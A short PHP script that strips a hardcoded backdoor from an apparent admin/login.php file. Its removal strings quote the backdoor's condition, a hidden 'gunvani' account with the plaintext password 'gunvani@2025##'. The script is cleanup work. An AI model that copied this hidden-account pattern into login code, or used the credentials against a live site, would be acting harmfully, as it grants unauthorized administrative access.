<?php
$file = 'admin/login.php';
$content = file_get_contents($file);

// Remove the two instances of hardcoded backdoor
$content = preg_replace("/\} elseif \(\\\$username === 'gunvani'.*?\} /s", "} ", $content);
$content = str_replace(" || (\$username === 'gunvani' && (\$password === 'gunvani@2025##' || \$password === 'gunvani'))", "", $content);

file_put_contents($file, $content);
echo "Done";
